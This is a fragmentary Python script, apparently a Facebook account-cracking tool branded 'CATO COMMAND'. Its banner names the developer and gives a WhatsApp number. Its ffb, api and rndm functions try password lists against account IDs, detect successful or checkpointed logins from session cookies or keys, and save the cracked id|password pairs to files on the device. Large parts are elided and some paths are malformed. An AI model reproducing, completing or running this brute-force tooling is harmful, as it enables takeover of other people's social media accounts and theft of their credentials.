 bfrom os import path
import os,base64,zlib,pip,urllib
os.system('xdg-open https://www.youtube.com/@zesshanli19996210/')
...
╔══════════════════════════════════════╗
║        WELCOME TO CATO COMMAND     ║     
╚══════════════════════════════════════╝                                     
╔══════════════════════════════════════╗
║\033[1;97m[+] DEVOLPER   : MR.ZESHAN        ║
║\033[1;97m[+] FACEBOOK   : ZESHAN MUGHAL        ║
║\033[1;97m[+] WHATSAPP   : 03424088009          ║
║\033[1;97m[+] GITHUB     :       ZESHANTIRITH  ║
║\033[1;97m[+] VERTION    : 1.1                  ║
╚══════════════════════════════════════╝""")
def linex():
	print('----------------------------------------------')
def clear():
...
def menu():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+923424088009 I &text="
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [CATO-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [CATO-OK] %s | %s'%(ids,pas))
                                open('/sdcard/CATO-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        print('\r\r\x1b[1;93m [CATO-CP] '+ids+' | '+pas+'\x1b[1;93m')
                                        open('/sdcard/CATO-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [CATO-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/CATO-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;93m [CATO-CP] '+ids+' | '+pas+'\x1b[1;93m')
                                                open('/CATO/Prince-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                                        continue
...
def rndm(ids,passlist):
    ...
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',}
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/CATO-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [CATO-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/CATO-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [CATO-OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcardCATO/-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
                                        continue
